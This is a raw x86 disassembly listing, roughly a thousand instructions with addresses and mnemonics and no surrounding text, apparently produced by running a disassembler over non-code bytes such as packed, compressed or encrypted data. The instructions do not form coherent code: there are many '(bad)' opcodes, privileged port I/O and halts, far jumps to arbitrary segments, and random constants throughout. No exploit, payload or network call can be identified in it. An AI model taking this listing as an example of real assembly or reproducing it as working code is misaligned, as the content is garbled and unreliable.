  4205be:	add    BYTE PTR [edi],ah
  4205c0:	and    BYTE PTR [ebp+0x11],dh
  4205c3:	out    dx,eax
  4205c4:	jl     0x420567
  4205c6:	mov    ch,0x27
  4205c8:	test   DWORD PTR [ebp-0x54],eax
  4205cb:	xchg   esp,eax
  4205cc:	mov    ds:0xa00c1fd5,al
  4205d1:	mov    ebx,0x8af23252
  4205d6:	mov    esp,0xbc0b6861
  4205db:	mov    edi,0x57a9f3f3
  4205e0:	sbb    al,0x73
  4205e2:	mov    ecx,0x883e83c7
  4205e7:	aas    
  4205e8:	mov    ch,0x7a
  4205ea:	sub    DWORD PTR [edi-0x67],eax
  4205ed:	and    BYTE PTR [edx+0x44],ah
  4205f0:	xchg   esp,eax
  4205f1:	mov    ds:0x93722a3c,al
  4205f6:	je     0x420674
  4205f8:	lods   eax,DWORD PTR ds:[esi]
  4205f9:	mov    edi,0x7a817bbc
  4205fe:	lsl    esp,WORD PTR [eax+0x11]
  420602:	or     ch,bl
  420604:	dec    esp
  420605:	popa   
  420606:	cld    
  420607:	or     DWORD PTR fs:[edi],ebx
  42060a:	ret    
  42060b:	mov    esp,0xbf78783f
  420610:	sbb    al,0x63
  420612:	in     al,dx
  420613:	push   0x1929d479
  420618:	sub    bl,cl
  42061a:	or     DWORD PTR [ebx],ebx
  42061c:	mov    al,0xcd
  42061e:	ret    0xda48
  420621:	and    BYTE PTR ss:[edi+0x124bae1e],bh
  420628:	mov    al,0xf6
  42062a:	adc    esi,DWORD PTR [ebx-0x1a]
  42062d:	int3   
  42062e:	dec    edi
  42062f:	test   cl,ch
  420631:	int    0x0
  420633:	mov    ds:0x7313f19f,eax
  420638:	lea    edi,[ebp+0x54ce4de2]
  42063e:	test   DWORD PTR [edi],edx
  420640:	lods   al,BYTE PTR ds:[esi]
  420641:	js     0x42067c
  420643:	clc    
  420644:	fistp  DWORD PTR [di+0x48]
  420648:	xchg   esi,eax
  420649:	cli    
  42064a:	xor    DWORD PTR [ecx+0x3251308d],ebx
  420650:	dec    edi
  420651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420652:	ins    BYTE PTR es:[edi],dx
  420653:	scas   eax,DWORD PTR es:[edi]
  420654:	lods   al,BYTE PTR ds:[esi]
  420655:	(bad)  
  420656:	iret   
  420657:	adc    BYTE PTR [eax],0xae
  42065a:	enter  0x7894,0x1c
  42065e:	xchg   DWORD PTR [ebx-0x50],edi
  420661:	popa   
  420662:	jmp    0x6edb:0x7399301f
  420669:	fisub  WORD PTR [eax+0x4a]
  42066c:	sbb    al,bh
  42066e:	push   0x253276c0
  420673:	shr    DWORD PTR ds:0x54856542,0x70
  42067a:	cmp    DWORD PTR [edx-0x34],edi
  42067d:	push   eax
  42067e:	mov    al,ds:0xbe2752d1
  420683:	lods   al,BYTE PTR ds:[esi]
  420684:	leave  
  420685:	lods   eax,DWORD PTR ds:[esi]
  420686:	inc    ebp
  420687:	mov    esi,0x386f9f57
  42068c:	gs cmp al,0x20
  42068f:	xor    eax,0x35ec329f
  420694:	jns    0x4206d2
  420696:	pushf  
  420697:	(bad)  
  420698:	mov    eax,0x24c0655d
  42069d:	mov    DWORD PTR [ecx],0xeb086cee
  4206a3:	iret   
  4206a4:	jno    0x420708
  4206a6:	xchg   esi,eax
  4206a7:	xchg   esi,eax
  4206a8:	inc    ebx
  4206a9:	fdivr  QWORD PTR ds:0xeff92b37
  4206af:	mov    ch,0xe9
  4206b1:	fisttp WORD PTR [esi-0x6730cee3]
  4206b7:	les    esp,FWORD PTR [edx]
  4206b9:	mov    dl,0xbd
  4206bb:	dec    edi
  4206bc:	pusha  
  4206bd:	fstp   TBYTE PTR [ecx+0x50474001]
  4206c3:	and    BYTE PTR [ebp+esi*8+0x7c2ece36],ch
  4206ca:	ins    DWORD PTR es:[edi],dx
  4206cb:	pop    es
  4206cc:	mov    dl,0x95
  4206ce:	ins    DWORD PTR es:[edi],dx
  4206cf:	hlt    
  4206d0:	jnp    0x42071e
  4206d2:	outs   dx,DWORD PTR ds:[esi]
  4206d3:	xchg   esi,eax
  4206d4:	pop    edi
  4206d5:	iret   
  4206d6:	add    BYTE PTR [esi],ch
  4206d8:	aam    0x2
  4206da:	popfw  
  4206dc:	jns    0x4206d4
  4206de:	test   DWORD PTR [eax+0x19d089e9],eax
  4206e4:	pop    ebx
  4206e5:	xchg   edx,eax
  4206e6:	sbb    eax,0xf01a22da
  4206eb:	and    eax,DWORD PTR [eax+0x4e8986d3]
  4206f1:	mov    al,ds:0x181e56d8
  4206f6:	xor    edi,DWORD PTR [ebp+0x15d813e5]
  4206fc:	and    eax,DWORD PTR [edi-0x50bb61bc]
  420702:	imul   eax,eax,0xffffff83
  420705:	das    
  420706:	and    DWORD PTR [ebx-0x2cca1f17],0x36
  42070d:	les    edx,FWORD PTR ds:0x3a969dc1
  420713:	inc    eax
  420714:	lods   eax,DWORD PTR ds:[esi]
  420715:	sti    
  420716:	mov    dh,0x56
  420718:	repnz (bad) 
  42071a:	inc    eax
  42071b:	dec    esi
  42071c:	loop   0x4206e7
  42071e:	xor    dl,bl
  420720:	mov    WORD PTR [ecx*1+0xbd51bee],fs
  420727:	add    eax,0x6de2c80e
  42072c:	mov    ds:0x5203c136,eax
  420731:	add    BYTE PTR fs:[edi],bl
  420734:	aas    
  420735:	pusha  
  420736:	ins    BYTE PTR es:[edi],dx
  420737:	aad    0xb4
  420739:	hlt    
  42073a:	cmp    eax,0x365f1f6
  42073f:	inc    ebx
  420740:	sbb    BYTE PTR [ecx-0x27f0ccf8],0x77
  420747:	xor    eax,0x71f030a1
  42074c:	div    DWORD PTR [ecx-0xc5a600f]
  420752:	dec    edi
  420753:	jge    0x420710
  420755:	add    DWORD PTR [edi+0x7c],ebx
  420758:	les    edi,FWORD PTR [esi-0xc687cfb]
  42075e:	mov    eax,ds:0x53416c7f
  420763:	add    ch,BYTE PTR [ebp+edi*8-0x5654d133]
  42076a:	add    al,BYTE PTR [eax+0x2f4d8069]
  420770:	aad    0xc4
  420772:	mov    ebp,0x3626ef6a
  420777:	xor    edx,DWORD PTR [edi]
  420779:	jmp    0x42079a
  42077b:	push   cs
  42077c:	gs cdq 
  42077e:	test   BYTE PTR [edx+0x77],cl
  420781:	ss stc 
  420783:	sub    edi,eax
  420785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420786:	xchg   ebp,eax
  420787:	or     bh,BYTE PTR [edx+0x75e7a33]
  42078d:	adc    eax,0xfaa92696
  420792:	pop    edi
  420793:	and    DWORD PTR [eax+0x1b],esi
  420796:	sub    cl,dh
  420798:	jno    0x4207ff
  42079a:	push   0x2d
  42079c:	(bad)  
  42079d:	push   ss
  42079e:	bnd jb 0x42079d
  4207a1:	retf   
  4207a2:	mov    dl,0xc4
  4207a4:	push   cs
  4207a5:	xchg   esp,eax
  4207a6:	add    al,BYTE PTR [ecx+edi*8+0x5f890305]
  4207ad:	jne    0x4207e4
  4207af:	xchg   ecx,esp
  4207b1:	mov    ebx,ebp
  4207b3:	sub    ecx,DWORD PTR [esi+0x3ff90832]
  4207b9:	test   ah,bl
  4207bb:	(bad)  
  4207bc:	jecxz  0x4207ce
  4207be:	push   ebp
  4207bf:	cdq    
  4207c0:	mov    ch,0x3b
  4207c2:	inc    ebp
  4207c3:	shl    DWORD PTR [ebx],cl
  4207c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c6:	je     0x420822
  4207c8:	pop    ebp
  4207c9:	adc    al,BYTE PTR [ebx-0x27]
  4207cc:	test   DWORD PTR [ecx*4-0x62ea237a],edx
  4207d3:	cmp    esi,DWORD PTR [edx]
  4207d5:	pop    ds
  4207d6:	(bad)  
  4207d7:	je     0x4207dd
  4207d9:	loop   0x42083c
  4207db:	nop
  4207dc:	ins    BYTE PTR es:[edi],dx
  4207dd:	rcr    DWORD PTR [esi+0x4b510d8b],0x1e
  4207e4:	inc    esi
  4207e5:	in     al,dx
  4207e6:	cli    
  4207e7:	mov    dl,cl
  4207e9:	and    al,0x16
  4207eb:	jb     0x420827
  4207ed:	in     eax,0xe1
  4207ef:	cdq    
  4207f0:	sub    bl,al
  4207f2:	xchg   esi,eax
  4207f3:	sbb    BYTE PTR [ecx],ch
  4207f5:	pushf  
  4207f6:	adc    cl,BYTE PTR [esi]
  4207f8:	add    eax,0xb54e28f0
  4207fd:	es aad 0xc9
  420800:	pop    esp
  420801:	nop
  420802:	retf   0x46f7
  420805:	imul   edi,DWORD PTR [ebp-0x7fe53dbe],0xa3723503
  42080f:	push   ebp
  420810:	sbb    al,0x1c
  420812:	add    dh,BYTE PTR [edi+0x6da7dc0b]
  420818:	addr16 iret 
  42081a:	cmp    eax,eax
  42081c:	test   eax,0xf61846ff
  420821:	or     eax,0xa463eae
  420826:	cdq    
  420827:	jmp    0x4207f1
  420829:	(bad)  
  42082b:	sbb    esi,DWORD PTR [esi]
  42082d:	mov    DWORD PTR [ebp+0x44ed432f],edx
  420833:	lahf   
  420834:	das    
  420835:	test   BYTE PTR [ecx+0x3d616939],al
  42083b:	push   cs
  42083c:	stos   DWORD PTR es:[edi],eax
  42083d:	add    eax,0xe7848036
  420842:	xchg   esp,eax
  420843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420844:	jnp    0x4207d8
  420846:	arpl   WORD PTR [eax+0x28545722],bx
  42084c:	inc    ecx
  42084d:	adc    al,0x23
  42084f:	jne    0x4208a9
  420851:	pop    ss
  420852:	push   0x2696be73
  420857:	mov    dl,0xe4
  420859:	jle    0x4208ad
  42085b:	xor    eax,0x28cc1e9
  420860:	ja     0x4208a9
  420862:	stc    
  420863:	fidiv  DWORD PTR [ecx]
  420865:	aam    0x28
  420867:	fnstsw WORD PTR [edx+0x10]
  42086a:	aaa    
  42086b:	int    0x54
  42086d:	gs out dx,al
  42086f:	adc    BYTE PTR [ecx+0x6355b18e],dh
  420875:	outs   dx,DWORD PTR ds:[esi]
  420876:	sbb    eax,0xcba493b3
  42087b:	jne    0x420809
  42087d:	mov    bh,ah
  42087f:	pop    es
  420880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420881:	outs   dx,DWORD PTR ds:[esi]
  420882:	dec    ebx
  420883:	test   DWORD PTR [bp+si],edi
  420886:	mov    dl,0xd8
  420888:	jb     0x4208c9
  42088a:	mov    ?,WORD PTR [edi+0x371c4ea1]
  420890:	in     al,dx
  420891:	shl    DWORD PTR [ebp+0x616ea554],0x6b
  420898:	ror    DWORD PTR [ebp+0x5c],0x26
  42089c:	in     al,0x24
  42089e:	xchg   ecx,eax
  42089f:	ret    0x6192
  4208a2:	xchg   ebp,eax
  4208a3:	inc    edx
  4208a4:	fnstsw WORD PTR [edi-0x33]
  4208a7:	adc    edx,edi
  4208a9:	pushf  
  4208aa:	add    edi,DWORD PTR [eax]
  4208ac:	mov    ah,BYTE PTR ds:0xbe8074a9
  4208b2:	xchg   ebp,eax
  4208b3:	xchg   ebp,eax
  4208b4:	test   al,0xa6
  4208b6:	lods   al,BYTE PTR ds:[esi]
  4208b7:	cmc    
  4208b8:	sub    DWORD PTR ds:0x1fb5a21d,0x60ef7ba6
  4208c2:	arpl   dx,bp
  4208c4:	pop    esi
  4208c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c6:	and    edi,DWORD PTR [ebx+0x298a6c9a]
  4208cc:	adc    DWORD PTR [ebx-0x3ae3274f],0x40
  4208d3:	push   ebx
  4208d4:	stos   DWORD PTR es:[edi],eax
  4208d5:	adc    eax,0xdb990944
  4208da:	mov    bh,BYTE PTR [ebx+0x77]
  4208dd:	and    ah,BYTE PTR [edi+0x5]
  4208e0:	jmp    0x42091e
  4208e2:	mov    bl,0xe
  4208e4:	test   edx,ebp
  4208e6:	sub    dh,ch
  4208e8:	push   eax
  4208e9:	mov    ds:0x52288c96,eax
  4208ee:	pop    esi
  4208ef:	dec    esi
  4208f0:	xor    al,0xa3
  4208f2:	xchg   esp,eax
  4208f3:	sahf   
  4208f4:	sub    al,0xc4
  4208f6:	into   
  4208f7:	sub    al,0x4
  4208f9:	fdiv   DWORD PTR [esi-0x69]
  4208fc:	pushf  
  4208fd:	clc    
  4208fe:	int3   
  4208ff:	jno    0x42096e
  420901:	and    al,dh
  420903:	push   edi
  420904:	test   BYTE PTR [ecx+0x44e1b03a],ah
  42090a:	popa   
  42090b:	pop    ebp
  42090c:	or     DWORD PTR [eax+0x3fd6e3d6],ecx
  420912:	pop    eax
  420913:	pop    ss
  420914:	mov    esi,0xf2530c96
  420919:	xor    al,0xf7
  42091b:	in     eax,dx
  42091c:	cmp    DWORD PTR [esp+eax*2+0x19c47821],esp
  420923:	dec    edi
  420924:	nop
  420925:	fistp  QWORD PTR [esi+0x3ef10c82]
  42092b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092c:	cwde   
  42092d:	scas   eax,DWORD PTR es:[edi]
  42092e:	jno    0x420934
  420930:	arpl   WORD PTR [edi-0x64546a4b],dx
  420936:	int    0x5e
  420938:	loopne 0x4208bf
  42093a:	aam    0x4f
  42093c:	cmp    eax,0x828acbe7
  420941:	cdq    
  420942:	sahf   
  420943:	ss dec esp
  420945:	add    esi,DWORD PTR [edx+eax*8]
  420948:	test   eax,0x4216b879
  42094d:	test   DWORD PTR [esi-0x777227da],esi
  420953:	das    
  420954:	xchg   esp,eax
  420955:	push   esi
  420956:	popa   
  420957:	add    al,0xf9
  420959:	shr    ebp,1
  42095b:	imul   BYTE PTR [esi]
  42095d:	bound  esi,QWORD PTR [ecx]
  42095f:	xlat   BYTE PTR ds:[ebx]
  420960:	in     eax,0x9d
  420962:	dec    esp
  420963:	jno    0x420931
  420965:	loope  0x420962
  420967:	pop    ss
  420968:	mov    al,0x30
  42096a:	ins    DWORD PTR es:[edi],dx
  42096b:	dec    ecx
  42096c:	pop    ebx
  42096d:	into   
  42096e:	sbb    BYTE PTR [edx+ebx*8],ah
  420971:	(bad)  
  420972:	sbb    ah,BYTE PTR [ecx-0x7f9be746]
  420978:	sbb    BYTE PTR cs:[edi-0x1234502b],dl
  42097f:	cmp    BYTE PTR [ecx+0x6f236056],dh
  420985:	inc    edx
  420986:	adc    al,0x23
  420988:	and    eax,0x71ead869
  42098d:	cld    
  42098e:	sub    esp,DWORD PTR [ecx]
  420990:	lods   eax,DWORD PTR ds:[esi]
  420991:	in     eax,dx
  420992:	dec    esp
  420993:	call   0x4e98:0x8088925e
  42099a:	xor    eax,0x40f60b32
  42099f:	cwde   
  4209a0:	add    BYTE PTR [ebp-0x5b],ch
  4209a3:	aam    0xd9
  4209a5:	lahf   
  4209a6:	cld    
  4209a7:	in     eax,0x9e
  4209a9:	and    bl,bh
  4209ab:	out    dx,al
  4209ac:	xor    BYTE PTR [edx],ch
  4209ae:	xchg   BYTE PTR [ebx],bh
  4209b0:	out    0xf5,al
  4209b2:	call   0x89185644
  4209b7:	mov    edi,0xa36c6123
  4209bc:	enter  0x7499,0x31
  4209c0:	push   esp
  4209c1:	sub    BYTE PTR [eax],al
  4209c3:	push   ecx
  4209c4:	iret   
  4209c5:	jno    0x420a03
  4209c7:	push   ss
  4209c8:	add    eax,0xf62c48b2
  4209cd:	push   edi
  4209ce:	mov    edx,DWORD PTR [esi-0xaeea15d]
  4209d4:	ss ins BYTE PTR es:[edi],dx
  4209d6:	mov    edi,0x1ef6348e
  4209db:	repnz pop ds
  4209dd:	dec    edx
  4209de:	es push es
  4209e0:	sti    
  4209e1:	mov    cl,0x48
  4209e3:	xor    DWORD PTR [edi-0x7028c5d9],ebp
  4209e9:	cs loope 0x420a4f
  4209ec:	sti    
  4209ed:	scas   al,BYTE PTR es:[edi]
  4209ee:	mov    ds:0xa86d14cd,al
  4209f3:	pop    eax
  4209f4:	les    ecx,FWORD PTR [ecx]
  4209f6:	aas    
  4209f7:	cs sbb ch,dh
  4209fa:	pop    esp
  4209fb:	sbb    eax,DWORD PTR [ebx+edx*4-0x1d]
  4209ff:	or     DWORD PTR [ecx-0x1fcf2ba2],edi
  420a05:	inc    edx
  420a06:	sbb    ebp,DWORD PTR [ecx-0x47ce8b82]
  420a0c:	stos   BYTE PTR es:[edi],al
  420a0d:	jo     0x4209b8
  420a0f:	mov    DWORD PTR [esi],0x7b3e357f
  420a15:	popf   
  420a16:	mov    eax,DWORD PTR [ebp+eiz*8+0x5e]
  420a1a:	push   ecx
  420a1b:	mov    edi,0xb0bf29dc
  420a20:	xchg   edx,eax
  420a21:	scas   eax,DWORD PTR es:[edi]
  420a22:	inc    edx
  420a23:	fistp  DWORD PTR [ebp+0x50]
  420a26:	pop    ebx
  420a27:	push   0xffffffba
  420a29:	retf   
  420a2a:	imul   edx,DWORD PTR [esi+0x50f27e99],0x44
  420a31:	mov    ebp,DWORD PTR [edx]
  420a33:	outs   dx,DWORD PTR ds:[esi]
  420a34:	and    edi,esp
  420a36:	mov    al,0xba
  420a38:	lock sbb eax,DWORD PTR [edx]
  420a3b:	adc    DWORD PTR [ecx+0x24],0x35
  420a3f:	stos   DWORD PTR es:[edi],eax
  420a40:	add    DWORD PTR [ebx-0x39bdd588],ebx
  420a46:	xlat   BYTE PTR ds:[ebx]
  420a47:	call   0x3c43da58
  420a4c:	into   
  420a4d:	push   cs
  420a4e:	xor    eax,0xea1fcf65
  420a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a54:	fadd   QWORD PTR [esi+0x14]
  420a57:	mov    eax,0xc8e00d51
  420a5c:	and    al,0xd9
  420a5e:	dec    ecx
  420a5f:	mov    ds:0xefe75567,al
  420a64:	xchg   ecx,eax
  420a65:	mov    ebx,0xc5e0e93f
  420a6a:	mov    eax,0x83261d
  420a6f:	in     eax,dx
  420a70:	test   al,0x35
  420a72:	xor    eax,0x88eece8d
  420a77:	jmp    0x47c26348
  420a7c:	sahf   
  420a7d:	jmp    0x420ad9
  420a7f:	repnz les ebp,FWORD PTR [eax-0x32192ee1]
  420a86:	cwde   
  420a87:	ficomp WORD PTR ds:0xc5ec8d58
  420a8d:	pop    esi
  420a8e:	dec    esi
  420a8f:	mov    edx,0x26a6def9
  420a94:	es in  eax,dx
  420a96:	(bad)  
  420a97:	mov    cl,0x25
  420a99:	cwde   
  420a9a:	mov    edx,0x83ef8c28
  420a9f:	mov    dh,0x28
  420aa1:	mov    ?,WORD PTR [esi+0x3e7ced08]
  420aa7:	sub    ebp,DWORD PTR [esi-0x23]
  420aaa:	data16 or dl,cl
  420aad:	dec    ebp
  420aae:	mov    cl,0xa
  420ab0:	jmp    0xd9ca6958
  420ab5:	test   al,0xa8
  420ab7:	jp     0x420b02
  420ab9:	sar    DWORD PTR [edi+0x19],0x4f
  420abd:	pop    ebp
  420abe:	test   al,dh
  420ac0:	jp     0x420ab8
  420ac2:	push   ebp
  420ac3:	nop
  420ac4:	call   0xb6183c5b
  420ac9:	retf   0x9288
  420acc:	or     BYTE PTR [esi],0x52
  420acf:	(bad)  
  420ad0:	cmp    BYTE PTR [esi-0x42],dl
  420ad3:	sub    BYTE PTR [edx-0x49],0x8e
  420ad7:	sub    BYTE PTR [esi],0x44
  420ada:	clc    
  420adb:	cs mov bl,0xb7
  420ade:	push   esp
  420adf:	sub    dl,dl
  420ae1:	lock push 0xffffffc5
  420ae4:	les    esi,FWORD PTR [eax+ebp*1-0x63cce1fa]
  420aeb:	lock or BYTE PTR [ebx],dh
  420aee:	dec    ecx
  420aef:	in     eax,dx
  420af0:	xlat   BYTE PTR ds:[ebx]
  420af1:	jp     0x420b24
  420af3:	add    al,al
  420af5:	inc    ecx
  420af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420af7:	sahf   
  420af8:	fld    DWORD PTR [esi-0x4c]
  420afb:	mov    edx,0xe3121f4f
  420b00:	adc    al,0xa1
  420b02:	fdiv   st(7),st
  420b04:	cmp    bh,BYTE PTR [esi]
  420b06:	ins    DWORD PTR es:[edi],dx
  420b07:	inc    ecx
  420b08:	mov    bl,0xb4
  420b0a:	inc    ecx
  420b0c:	test   DWORD PTR [edi],eax
  420b0e:	mov    ch,0x4
  420b10:	scas   al,BYTE PTR es:[edi]
  420b11:	dec    ebp
  420b12:	mov    ecx,0x6daef439
  420b17:	xlat   BYTE PTR ds:[ebx]
  420b18:	imul   BYTE PTR [ebp+ecx*2+0x7b]
  420b1c:	jge    0x420ae6
  420b1e:	test   DWORD PTR [esi+esi*1+0x2e],esi
  420b22:	stc    
  420b23:	clc    
  420b24:	(bad)  
  420b25:	stc    
  420b26:	pop    ecx
  420b27:	lock lea esp,[edi]
  420b2a:	or     DWORD PTR [eax+0x7f],ebx
  420b2d:	and    eax,0x49ad2ad0
  420b32:	or     BYTE PTR [eax],cl
  420b34:	lods   eax,DWORD PTR ds:[esi]
  420b35:	sar    DWORD PTR [ebp+0x1a],1
  420b38:	dec    esp
  420b39:	ds popa 
  420b3b:	adc    al,0xdc
  420b3d:	dec    edi
  420b3e:	mov    esi,0xb28ec527
  420b43:	xchg   ebp,eax
  420b44:	mov    ebp,0xf4435dbc
  420b49:	push   0xffffff9a
  420b4b:	sbb    DWORD PTR [ecx],ebp
  420b4d:	mov    esi,0x7012d61c
  420b52:	mov    ecx,0xa5515f8e
  420b57:	xchg   esi,eax
  420b58:	cwde   
  420b59:	rcr    DWORD PTR [ecx-0x27],cl
  420b5c:	jmp    0x90310005
  420b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b62:	mov    ebp,0xa30d6377
  420b67:	dec    esi
  420b68:	sub    BYTE PTR [eax+0x5d],ch
  420b6b:	mov    DWORD PTR [edx+0x46],edx
  420b6e:	pop    eax
  420b6f:	lods   al,BYTE PTR ds:[esi]
  420b70:	ror    ah,cl
  420b72:	je     0x420bdb
  420b74:	retf   
  420b75:	sbb    dh,BYTE PTR [eax+0x6f]
  420b78:	sar    al,cl
  420b7a:	push   edx
  420b7b:	push   ebx
  420b7c:	jo     0x420b10
  420b7e:	cmp    esi,esi
  420b80:	jnp    0x420ba6
  420b82:	test   DWORD PTR [ecx-0x75],edx
  420b85:	xor    WORD PTR [edx+0x70],ax
  420b89:	push   0x25
  420b8b:	retf   
  420b8c:	sti    
  420b8d:	js     0x420c0e
  420b8f:	nop
  420b90:	sub    eax,0x8a8a961f
  420b95:	fadd   st(5),st
  420b97:	test   BYTE PTR [edi],0xe3
  420b9a:	fcom   QWORD PTR [ebx+eiz*4-0x5b9a82ea]
  420ba1:	ins    DWORD PTR es:[edi],dx
  420ba2:	jo     0x420bfd
  420ba4:	in     al,0x2f
  420ba6:	std    
  420ba7:	and    dl,BYTE PTR [esi]
  420ba9:	mov    ah,0xd7
  420bab:	icebp  
  420bac:	adc    eax,0xfe639c52
  420bb1:	add    ebx,DWORD PTR [eax+0x6aa6c91d]
  420bb7:	imul   ecx,DWORD PTR [ebp-0x64],0xa7da1429
  420bbe:	xchg   ecx,esp
  420bc0:	jo     0x420bdb
  420bc2:	pop    ds
  420bc3:	out    dx,al
  420bc4:	popa   
  420bc5:	xchg   esi,eax
  420bc6:	fsub   DWORD PTR [edi+0x5d]
  420bc9:	dec    edi
  420bca:	test   dh,0x73
  420bcd:	jbe    0x420bee
  420bcf:	ficomp WORD PTR [eax]
  420bd1:	gs adc dl,bh
  420bd4:	(bad)  
  420bd5:	jb     0x420bc6
  420bd7:	and    DWORD PTR [edi],esi
  420bd9:	popf   
  420bda:	data16 jg 0x420bce
  420bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bde:	test   bh,cl
  420be0:	jno    0x420c27
  420be2:	cmp    al,0xed
  420be4:	fisub  DWORD PTR [esi]
  420be6:	push   ebp
  420be7:	cld    
  420be8:	mov    cl,0xf2
  420bea:	mov    eax,ds:0x8239e71f
  420bef:	mov    DWORD PTR [esi-0x4c],esp
  420bf2:	in     eax,0x2b
  420bf4:	gs jecxz 0x420b80
  420bf7:	jecxz  0x420c5f
  420bf9:	pop    ss
  420bfa:	(bad)  
  420bfb:	iret   
  420bfc:	cmp    al,0x16
  420bfe:	ja     0x420bc9
  420c00:	jp     0x420c72
  420c02:	mov    dl,0x4
  420c04:	ret    
  420c05:	cmp    cl,al
  420c07:	xor    DWORD PTR [edi],edi
  420c09:	xchg   edx,eax
  420c0a:	push   ebp
  420c0b:	jmp    0xb4d8b813
  420c10:	pop    es
  420c11:	dec    edx
  420c12:	into   
  420c13:	fidiv  WORD PTR [ecx+eax*2+0x4d4d6f7]
  420c1a:	rol    DWORD PTR [ecx-0x40],cl
  420c1d:	test   BYTE PTR [edi-0x5b],bh
  420c20:	icebp  
  420c21:	adc    eax,0x1cd29b36
  420c26:	add    al,BYTE PTR [ebx]
  420c28:	push   edi
  420c29:	push   0xb3a3bbf5
  420c2e:	(bad)  
  420c2f:	inc    ebp
  420c30:	add    al,0xd
  420c32:	mov    ebx,0x9c4a02a4
  420c37:	in     al,0x7d
  420c39:	lds    eax,FWORD PTR [edi+edi*4+0x29]
  420c3d:	(bad)  
  420c3e:	or     al,0xb0
  420c40:	fcmovb st,st(3)
  420c42:	std    
  420c43:	ror    DWORD PTR [ecx+eiz*2-0x533cf5de],1
  420c4a:	lods   eax,DWORD PTR ds:[esi]
  420c4b:	inc    esi
  420c4c:	std    
  420c4d:	and    ebx,eax
  420c4f:	nop
  420c50:	in     eax,dx
  420c51:	mov    al,ds:0xf91b0367
  420c56:	jmp    0x2d6e:0x380387a3
  420c5d:	xlat   BYTE PTR ds:[ebx]
  420c5e:	adc    esi,esi
  420c60:	in     eax,dx
  420c61:	in     al,dx
  420c62:	xchg   esi,eax
  420c63:	retf   0x9306
  420c66:	jle    0x420c9c
  420c68:	mov    bh,0x41
  420c6a:	sti    
  420c6b:	jmp    0x420c10
  420c6d:	popf   
  420c6e:	in     eax,dx
  420c6f:	sbb    DWORD PTR [esi+0x5e7964aa],edx
  420c75:	jg     0x420c30
  420c77:	push   ds
  420c78:	xchg   ebx,eax
  420c79:	or     eax,0x3c7654d9
  420c7e:	cli    
  420c7f:	mov    ebx,DWORD PTR [edi+0x5f9087e5]
  420c85:	push   0x3e40aad4
  420c8a:	and    ecx,edi
  420c8c:	or     ch,BYTE PTR [edi]
  420c8e:	sbb    bh,BYTE PTR [ebx+0x52]
  420c91:	sub    al,0xbb
  420c93:	lds    ecx,FWORD PTR [edi]
  420c95:	push   ebx
  420c96:	add    bl,cl
  420c98:	pop    ds
  420c99:	fisttp WORD PTR [eax-0x54]
  420c9c:	or     al,0xa5
  420c9e:	xor    eax,0xa0babed5
  420ca3:	(bad)  
  420ca4:	push   ds
  420ca5:	mov    ebp,0x8d92d2b9
  420caa:	jo     0x420c80
  420cac:	pop    edx
  420cad:	jnp    0x420d1c
  420caf:	jg     0x420c31
  420cb1:	das    
  420cb2:	push   ds
  420cb3:	jno    0x420c67
  420cb5:	retf   
  420cb6:	ins    BYTE PTR es:[edi],dx
  420cb7:	add    DWORD PTR [edx-0x47274241],ebp
  420cbd:	inc    esp
  420cbe:	xchg   esp,eax
  420cbf:	clc    
  420cc0:	hlt    
  420cc1:	push   edx
  420cc2:	and    ebx,DWORD PTR [esi-0x68]
  420cc5:	xlat   BYTE PTR ds:[ebx]
  420cc6:	push   es
  420cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc8:	stos   DWORD PTR es:[edi],eax
  420cc9:	and    BYTE PTR [eax-0x4b93fb1d],al
  420ccf:	mov    ch,0x75
  420cd1:	xchg   edx,eax
  420cd2:	sub    esp,eax
  420cd4:	aaa    
  420cd5:	mov    edi,0xb9df7292
  420cda:	out    dx,eax
  420cdb:	cmp    al,0x4c
  420cdd:	or     ebp,DWORD PTR [edx+esi*4+0x4d]
  420ce1:	sbb    ch,BYTE PTR [edi]
  420ce3:	mov    ecx,edx
  420ce5:	fimul  WORD PTR [edi-0x1e]
  420ce8:	je     0x420c71
  420cea:	jmp    0xa9d57215
  420cef:	add    DWORD PTR [edx-0x5f],ecx
  420cf2:	xchg   esp,eax
  420cf3:	bound  eax,QWORD PTR [edi+eiz*4-0x2a]
  420cf7:	jg     0x420d39
  420cf9:	mov    esi,0xfd1e63f0
  420cfe:	int3   
  420cff:	mov    WORD PTR [ecx+0x69],?
  420d02:	xor    cl,dh
  420d04:	mov    ebp,ecx
  420d06:	js     0x420d83
  420d08:	aam    0x81
  420d0a:	lds    eax,FWORD PTR [edx+0x3e]
  420d0d:	xchg   DWORD PTR [eax-0x7b],edx
  420d10:	add    DWORD PTR [edx],esi
  420d12:	je     0x420d7d
  420d14:	in     al,dx
  420d15:	xor    al,0x90
  420d17:	int    0xda
  420d19:	or     BYTE PTR [ebx+ebp*8+0x1f701e13],ah
  420d20:	je     0x420cd9
  420d22:	int3   
  420d23:	mov    ebx,0x130d8154
  420d28:	add    ah,bl
  420d2a:	ret    
  420d2b:	aas    
  420d2c:	pop    esp
  420d2d:	clc    
  420d2e:	or     DWORD PTR [edi+0x6b],ebx
  420d31:	je     0x420cb3
  420d33:	cs jmp 0xeea33efb
  420d39:	fmul   st(2),st
  420d3b:	jp     0x420d25
  420d3d:	inc    ebp
  420d3e:	in     al,0x0
  420d40:	sbb    ebp,DWORD PTR [eax+0x2d]
  420d43:	mov    ds:0x640775ea,al
  420d48:	aam    0x4a
  420d4a:	cmp    al,0x27
  420d4c:	cmp    eax,0xcd6d6f4f
  420d51:	inc    ebp
  420d52:	push   ds
  420d53:	mov    ch,0xa6
  420d55:	daa    
  420d56:	or     eax,0xe7016f5f
  420d5b:	xchg   esi,eax
  420d5c:	popa   
  420d5d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420d5f:	test   al,0xf9
  420d61:	adc    dl,ah
  420d63:	popf   
  420d64:	jns    0x420d12
